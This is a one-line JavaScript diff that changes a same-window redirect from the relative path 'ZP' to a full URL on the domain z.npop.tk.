@@ -1,1 +1,1 @@
-window.open('ZP','_self');
+window.open('https://z.npop.tk/ZP','_self');
